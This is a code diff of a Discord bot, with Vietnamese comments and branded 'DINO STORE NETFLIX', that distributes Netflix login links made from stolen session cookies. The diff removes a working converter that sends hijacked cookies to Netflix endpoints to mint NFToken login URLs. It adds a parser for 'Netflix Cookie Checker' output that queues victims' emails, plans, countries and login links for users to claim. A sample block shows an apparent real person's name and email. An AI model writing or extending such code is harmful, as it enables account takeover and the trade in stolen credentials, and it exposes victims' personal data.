@@ -26,7 +26,7 @@ const DISCORD_TOKEN     = process.env.DISCORD_TOKEN;
 const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID;
 const GUILD_ID          = process.env.GUILD_ID;
 const ADMIN_IDS         = (process.env.ADMIN_IDS || '').split(',').map(s => s.trim()).filter(Boolean);
-const DATABASE_URL      = process.env.DATABASE_URL; // Railway tự inject
+const DATABASE_URL      = process.env.DATABASE_URL;
 
 // ─── POSTGRESQL ───────────────────────────────────────────────────────────────
 const pool = new pg.Pool({
@@ -38,23 +38,24 @@ async function initDB() {
   await pool.query(`
     CREATE TABLE IF NOT EXISTS cookie_queue (
       id         SERIAL PRIMARY KEY,
-      raw_cookie TEXT    NOT NULL,
       email      TEXT,
       plan       TEXT,
+      country    TEXT,
+      pc_link    TEXT NOT NULL,
+      phone_link TEXT NOT NULL,
       added_at   TIMESTAMP DEFAULT NOW()
     )
   `);
   console.log('✅ DB ready');
 }
 
-/** Lấy số lượng cookie còn lại */
 async function countCookies() {
   const { rows } = await pool.query('SELECT COUNT(*) AS cnt FROM cookie_queue');
   return parseInt(rows[0].cnt, 10);
 }
 
-/** Lấy 1 cookie đầu hàng (FIFO) rồi XÓA luôn */
-async function popCookie() {
+/** Lấy 1 entry đầu hàng rồi xoá luôn (atomic) */
+async function popEntry() {
   const { rows } = await pool.query(`
     DELETE FROM cookie_queue
     WHERE id = (SELECT id FROM cookie_queue ORDER BY id ASC LIMIT 1)
@@ -63,146 +64,89 @@ async function popCookie() {
   return rows[0] || null;
 }
 
-/** Lưu nhiều cookie vào DB */
-async function pushCookies(blocks) {
-  if (!blocks.length) return 0;
-  const values = blocks.map((b, i) =>
-    `($${i * 3 + 1}, $${i * 3 + 2}, $${i * 3 + 3})`
+async function pushEntries(entries) {
+  if (!entries.length) return 0;
+  const values = entries.map((_, i) =>
+    `($${i * 5 + 1}, $${i * 5 + 2}, $${i * 5 + 3}, $${i * 5 + 4}, $${i * 5 + 5})`
   ).join(', ');
-  const params = blocks.flatMap(b => [b.raw, b.email || null, b.plan || null]);
+  const params = entries.flatMap(e => [e.email, e.plan, e.country, e.pcLink, e.phoneLink]);
   await pool.query(
-    `INSERT INTO cookie_queue (raw_cookie, email, plan) VALUES ${values}`,
+    `INSERT INTO cookie_queue (email, plan, country, pc_link, phone_link) VALUES ${values}`,
     params,
   );
-  return blocks.length;
+  return entries.length;
 }
 
-// ─── COOKIE FILE PARSER ───────────────────────────────────────────────────────
+// ─── PARSER: Netflix Checker output format ────────────────────────────────────
 /**
- * Tách file txt chứa nhiều cookie block thành mảng.
- * Mỗi block = phần metadata (– Email:...) + dòng Netscape (.netflix.com\t...)
+ * Parse file output từ Netflix Cookie Checker.
+ * Mỗi block trông như sau:
  *
- * Format ví dụ:
- *   – Email: xxx@gmail.com
- *   – Plan: Standard
+ *   NETFLIX HIT : ⚙
+ *   Name: Geni
+ *   Email: genisafir01@gmail.com
+ *   Country: US
+ *   Plan: Premium
  *   ...
- *   .netflix.com   TRUE  /  TRUE  12345  NetflixId  xxx
- *   .netflix.com   TRUE  /  TRUE  12345  SecureNetflixId  xxx
- *   (dòng trống)
- *   – Email: yyy@gmail.com   ← block tiếp theo
+ *   NFToken DETAILS : ⚙
+ *   NFToken: xxx
+ *   PC Login: https://www.netflix.com/?nftoken=xxx
+ *   Phone Login: https://www.netflix.com/unsupported?nftoken=xxx
+ *   Valid Till (UTC): ...
+ *   ---...
  */
-function parseMultiCookieFile(rawText) {
-  const blocks  = [];
+function parseCheckerOutput(rawText) {
+  const entries = [];
   const lines   = rawText.split(/\r?\n/);
-  let current   = null; // { metaLines, cookieLines }
 
-  function flushBlock() {
-    if (!current) return;
-    const cookieLines = current.cookieLines.filter(l => l.trim());
-    if (!cookieLines.length) return;
+  let inBlock  = false;
+  let current  = {};
 
-    // Ghép lại thành Netscape format chuẩn (chỉ các dòng cookie thật)
-    const raw = cookieLines.join('\n');
-
-    // Trích email và plan từ metadata
-    const emailLine = current.metaLines.find(l => /email/i.test(l));
-    const planLine  = current.metaLines.find(l => /plan/i.test(l));
-
-    const email = emailLine ? emailLine.replace(/.*:\s*/, '').trim() : null;
-    const plan  = planLine  ? planLine.replace(/.*:\s*/, '').trim() : null;
-
-    blocks.push({ raw, email, plan });
-    current = null;
+  function flush() {
+    if (current.pcLink && current.phoneLink) {
+      entries.push({ ...current });
+    }
+    current = {};
+    inBlock = false;
   }
 
   for (const line of lines) {
-    const trimmed = line.trim();
+    const t = line.trim();
 
-    // Dòng bắt đầu block mới (dòng metadata – Email:)
-    if (/^[–\-—]\s*Email:/i.test(trimmed)) {
-      flushBlock();
-      current = { metaLines: [trimmed], cookieLines: [] };
+    // Bắt đầu block mới
+    if (/^NETFLIX HIT/i.test(t)) {
+      if (inBlock) flush();
+      inBlock = true;
+      current = {};
       continue;
     }
 
-    if (!current) continue;
+    if (!inBlock) continue;
 
-    // Dòng metadata khác (– Plan:, – Country:...)
-    if (/^[–\-—]\s*\w+:/.test(trimmed)) {
-      current.metaLines.push(trimmed);
+    // Dấu phân cách → kết thúc block
+    if (/^-{10,}/.test(t)) {
+      flush();
       continue;
     }
 
-    // Dòng Netscape cookie (.netflix.com\t...)
-    if (trimmed.startsWith('.netflix.com') || trimmed.startsWith('#')) {
-      current.cookieLines.push(trimmed);
-      continue;
-    }
+    // Trích thông tin
+    const emailM   = t.match(/^Email:\s*(.+)/i);
+    const planM    = t.match(/^Plan:\s*(.+)/i);
+    const countryM = t.match(/^Country:\s*(.+)/i);
+    const pcM      = t.match(/^PC Login:\s*(https?:\/\/\S+)/i);
+    const phoneM   = t.match(/^Phone Login:\s*(https?:\/\/\S+)/i);
 
-    // Dòng trống = kết thúc block hiện tại
-    if (!trimmed) {
-      flushBlock();
-    }
+    if (emailM)   current.email    = emailM[1].trim();
+    if (planM)    current.plan     = planM[1].trim();
+    if (countryM) current.country  = countryM[1].trim();
+    if (pcM)      current.pcLink   = pcM[1].trim();
+    if (phoneM)   current.phoneLink = phoneM[1].trim();
   }
 
-  flushBlock(); // flush block cuối nếu file không kết thúc bằng dòng trống
-  return blocks;
-}
+  // Flush block cuối nếu file không kết thúc bằng dashes
+  if (inBlock) flush();
 
-// ─── COOKIE HELPERS ───────────────────────────────────────────────────────────
-function parseCookieLines(raw) {
-  const cookies = {};
-  for (const line of raw.split(/\r?\n/)) {
-    if (!line || line.startsWith('#')) continue;
-    const parts = line.split('\t');
-    if (parts.length < 7) continue;
-    cookies[parts[5].trim()] = parts[6].trim();
-  }
-  return cookies;
-}
-
-function buildCookieHeader(cookies) {
-  return Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
-}
-
-function generateTvCode(nftoken) {
-  return nftoken.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 8);
-}
-
-function buildLinks(nftoken) {
-  return {
-    phone: `https://www.netflix.com/unsupported?nftoken=${nftoken}`,
-    pc:    `https://www.netflix.com/?nftoken=${nftoken}`,
-    tv:    generateTvCode(nftoken),
-  };
-}
-
-async function convertCookieToNFToken(cookieHeader, mode = 'both') {
-  const headers = {
-    Cookie: cookieHeader,
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-    'Accept-Language': 'en-US,en;q=0.9',
-    Referer: 'https://www.netflix.com/',
-  };
-  const cfg = { headers, timeout: 15_000 };
-
-  const acct = await axios.get('https://www.netflix.com/YourAccount', cfg);
-  if (!acct.data.includes('netflix-sans')) throw new Error('INVALID_COOKIE');
-
-  const email   = acct.data.match(/"emailAddress"\s*:\s*"([^"]+)"/)?.[1]   || '??';
-  const plan    = acct.data.match(/"planName"\s*:\s*"([^"]+)"/)?.[1]        || '??';
-  const country = acct.data.match(/"countryOfSignup"\s*:\s*"([^"]+)"/)?.[1] || '??';
-
-  const tok = await axios.get('https://www.netflix.com/api/mre/login-with-token/v1', {
-    ...cfg,
-    params: {
-      appName:     mode === 'mobile' ? 'nflx-android-app' : 'nflx-web',
-      deviceModel: mode === 'mobile' ? 'phone' : 'browser',
-    },
-  });
-
-  if (!tok.data?.nftoken) throw new Error('TOKEN_FETCH_FAILED');
-  return { email, plan, country, nftoken: tok.data.nftoken, links: buildLinks(tok.data.nftoken) };
+  return entries;
 }
 
 // ─── DISCORD CLIENT ───────────────────────────────────────────────────────────
@@ -218,24 +162,24 @@ const client = new Client({
 const commands = [
   new SlashCommandBuilder()
     .setName('start')
-    .setDescription('Hiển thị bảng chọn thiết bị để lấy link Netflix'),
+    .setDescription('Lấy link Netflix (PC hoặc Điện Thoại)'),
 
   new SlashCommandBuilder()
     .setName('upcookie')
-    .setDescription('Upload file TXT chứa nhiều cookie (Admin only)')
+    .setDescription('Upload file output từ Netflix Checker (Admin only)')
     .addAttachmentOption(opt =>
       opt.setName('file')
-        .setDescription('File .txt chứa nhiều cookie block')
+        .setDescription('File .txt output từ Netflix Cookie Checker')
         .setRequired(true)
     ),
 ].map(c => c.toJSON());
 
 async function registerCommands() {
-  const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
+  const rest  = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
+  const route = GUILD_ID
+    ? Routes.applicationGuildCommands(DISCORD_CLIENT_ID, GUILD_ID)
+    : Routes.applicationCommands(DISCORD_CLIENT_ID);
   try {
-    const route = GUILD_ID
-      ? Routes.applicationGuildCommands(DISCORD_CLIENT_ID, GUILD_ID)
-      : Routes.applicationCommands(DISCORD_CLIENT_ID);
     await rest.put(route, { body: commands });
     console.log(`✅ Đã đăng ký ${commands.length} slash commands`);
   } catch (err) {
@@ -243,9 +187,9 @@ async function registerCommands() {
   }
 }
 
-// ─── HELPERS UI ───────────────────────────────────────────────────────────────
-function planToEmoji(plan) {
-  const p = (plan || '').toLowerCase();
+// ─── HELPERS ──────────────────────────────────────────────────────────────────
+function planToEmoji(plan = '') {
+  const p = plan.toLowerCase();
   if (p.includes('premium'))  return '💎';
   if (p.includes('standard')) return '⭐';
   if (p.includes('basic'))    return '🔵';
@@ -253,50 +197,15 @@ function planToEmoji(plan) {
   return '🎬';
 }
 
-function friendlyError(msg) {
-  return {
-    INVALID_COOKIE:          'Cookie không hợp lệ hoặc đã hết hạn.',
-    TOKEN_FETCH_FAILED:      'Không lấy được NFToken. Thử lại sau.',
-    MISSING_NETFLIX_COOKIES: 'Cookie thiếu `NetflixId`. Kiểm tra lại file.',
-  }[msg] || `Lỗi: ${msg}`;
-}
-
-function buildResultEmbed(result, mode) {
-  const { email, plan, country, links } = result;
-  const embed = new EmbedBuilder()
-    .setColor(0xe50914)
-    .setTitle('✅ Tạo Link Thành Công!')
-    .addFields(
-      { name: '📧 Email',                  value: `\`${email}\``, inline: true },
-      { name: `${planToEmoji(plan)} Plan`, value: plan,            inline: true },
-      { name: '🌍 Country',                value: country,         inline: true },
-    )
-    .setFooter({ text: `DINO STORE NETFLIX • ${new Date().toLocaleTimeString('vi-VN')}` });
-
-  if (mode === 'mobile' || mode === 'both')
-    embed.addFields({ name: '📱 Link Điện Thoại', value: `[Mở Link](${links.phone})\n\`${links.phone}\`` });
-  if (mode === 'pc' || mode === 'both')
-    embed.addFields({ name: '🖥️ Link Máy Tính',   value: `[Mở Link](${links.pc})\n\`${links.pc}\`` });
-  if (mode === 'tv' || mode === 'both')
-    embed.addFields({ name: '📺 TV Code',          value: `\`\`\`${links.tv}\`\`\`` });
-
-  return embed;
-}
-
-/** Cập nhật status bot theo số cookie còn lại */
 async function updateStatus() {
   const count = await countCookies();
-  if (count === 0) {
-    client.user.setPresence({
-      status: 'idle',
-      activities: [{ name: '❌ Hết cookie — chờ admin upload', type: ActivityType.Watching }],
-    });
-  } else {
-    client.user.setPresence({
-      status: 'idle',
-      activities: [{ name: `🎬 ${count} cookie sẵn sàng`, type: ActivityType.Watching }],
-    });
-  }
+  client.user.setPresence({
+    status: 'idle',
+    activities: [{
+      name: count > 0 ? `🎬 ${count} link sẵn sàng` : '❌ Hết link — chờ admin',
+      type: ActivityType.Watching,
+    }],
+  });
 }
 
 // ─── READY ────────────────────────────────────────────────────────────────────
@@ -315,9 +224,14 @@ client.on(Events.InteractionCreate, async (interaction) => {
     const count = await countCookies();
 
     const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId('btn_phone').setLabel('📱 Link Điện Thoại').setStyle(ButtonStyle.Primary),
-      new ButtonBuilder().setCustomId('btn_pc')   .setLabel('🖥️ Link Máy Tính')  .setStyle(ButtonStyle.Primary),
-      new ButtonBuilder().setCustomId('btn_tv')   .setLabel('📺 TV Code')         .setStyle(ButtonStyle.Secondary),
+      new ButtonBuilder()
+        .setCustomId('btn_phone')
+        .setLabel('📱 Link Điện Thoại')
+        .setStyle(ButtonStyle.Primary),
+      new ButtonBuilder()
+        .setCustomId('btn_pc')
+        .setLabel('🖥️ Link Máy Tính')
+        .setStyle(ButtonStyle.Primary),
     );
 
     const embed = new EmbedBuilder()
@@ -326,9 +240,8 @@ client.on(Events.InteractionCreate, async (interaction) => {
       .setDescription(
         '**Chọn loại link bạn muốn tạo:**\n\n' +
         '📱 **Điện Thoại** – Tối ưu cho mobile\n' +
-        '🖥️ **Máy Tính** – Tối ưu cho desktop\n' +
-        '📺 **TV** – Mã TV 8 ký tự\n\n' +
-        `> 🗂️ Còn **${count}** cookie trong kho`,
+        '🖥️ **Máy Tính** – Tối ưu cho desktop\n\n' +
+        `> 🗂️ Còn **${count}** link trong kho`,
       )
       .setFooter({ text: 'Bot by DINO STORE NETFLIX' });
 
@@ -345,7 +258,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
     const attachment = interaction.options.getAttachment('file');
     if (!attachment.name.toLowerCase().endsWith('.txt')) {
-      await interaction.reply({ content: '❌ Chỉ nhận file `.txt`.' });
+      await interaction.reply({ content: '❌ Chỉ nhận file `.txt` output từ Netflix Checker.' });
       return;
     }
 
@@ -353,16 +266,22 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
     try {
       const res     = await axios.get(attachment.url, { responseType: 'text', timeout: 10_000 });
-      const blocks  = parseMultiCookieFile(res.data);
+      const entries = parseCheckerOutput(res.data);
 
-      if (!blocks.length) {
-        await interaction.editReply('❌ Không tìm thấy cookie hợp lệ trong file. Kiểm tra lại format.');
+      if (!entries.length) {
+        await interaction.editReply(
+          '❌ Không tìm thấy link hợp lệ trong file.\n' +
+          'Đảm bảo file là output từ **Netflix Cookie Checker** có dòng `PC Login:` và `Phone Login:`.',
+        );
         return;
       }
 
-      const saved = await pushCookies(blocks);
+      const saved = await pushEntries(entries);
       await updateStatus();
-      await interaction.editReply(`✅ Đã thêm **${saved}** cookie vào hàng đợi. Tổng hiện tại: **${await countCookies()}** cookie.`);
+      const total = await countCookies();
+      await interaction.editReply(
+        `✅ Đã thêm **${saved}** link vào hàng đợi.\n🗂️ Tổng hiện tại: **${total}** link.`,
+      );
     } catch (err) {
       await interaction.editReply(`❌ Lỗi: ${err.message}`);
       console.error('[upcookie]', err);
@@ -372,13 +291,9 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
   // ── Button clicks ──────────────────────────────────────────────────────────
   if (interaction.isButton()) {
-    const modeMap = { btn_phone: 'mobile', btn_pc: 'pc', btn_tv: 'tv' };
-    const mode    = modeMap[interaction.customId];
-    if (!mode) return;
-
+    const mode = interaction.customId === 'btn_phone' ? 'phone' : 'pc';
     await interaction.deferReply();
 
-    // Kiểm tra hết cookie
     const count = await countCookies();
     if (count === 0) {
       await interaction.editReply(
@@ -387,31 +302,31 @@ client.on(Events.InteractionCreate, async (interaction) => {
       return;
     }
 
-    // Pop cookie đầu tiên khỏi DB
-    const row = await popCookie();
-    if (!row) {
-      await interaction.editReply('❌ Hết link cookie netflix! Vui lòng chờ admin **Tún Kịt** upload thêm.');
+    const entry = await popEntry();
+    if (!entry) {
+      await interaction.editReply(
+        '❌ Hết link cookie netflix! Vui lòng chờ admin **Tún Kịt** upload thêm.',
+      );
       return;
     }
 
-    try {
-      const cookies = parseCookieLines(row.raw_cookie);
+    const link = mode === 'phone' ? entry.phone_link : entry.pc_link;
 
-      if (!cookies['NetflixId'] && !cookies['authURL']) {
-        // Cookie này lỗi → thử pop cái tiếp theo không, chỉ báo lỗi
-        await interaction.editReply('⚠️ Cookie vừa lấy bị lỗi và đã bị xoá. Thử lại để lấy cookie khác.');
-        await updateStatus();
-        return;
-      }
+    const embed = new EmbedBuilder()
+      .setColor(0xe50914)
+      .setTitle('✅ Tạo Link Thành Công!')
+      .addFields(
+        { name: '📧 Email',                            value: `\`${entry.email || '??'}\``, inline: true },
+        { name: `${planToEmoji(entry.plan)} Plan`,     value: entry.plan    || '??',        inline: true },
+        { name: '🌍 Country',                          value: entry.country || '??',        inline: true },
+        {
+          name:  mode === 'phone' ? '📱 Link Điện Thoại' : '🖥️ Link Máy Tính',
+          value: `[Mở Link](${link})\n\`${link}\``,
+        },
+      )
+      .setFooter({ text: `DINO STORE NETFLIX • ${new Date().toLocaleTimeString('vi-VN')}` });
 
-      const result = await convertCookieToNFToken(buildCookieHeader(cookies), mode);
-      await interaction.editReply({ embeds: [buildResultEmbed(result, mode)] });
-    } catch (err) {
-      await interaction.editReply(`❌ ${friendlyError(err.message)}`);
-      console.error('[button]', err.message);
-    }
-
-    // Cập nhật status sau mỗi lần dùng
+    await interaction.editReply({ embeds: [embed] });
     await updateStatus();
   }
 });
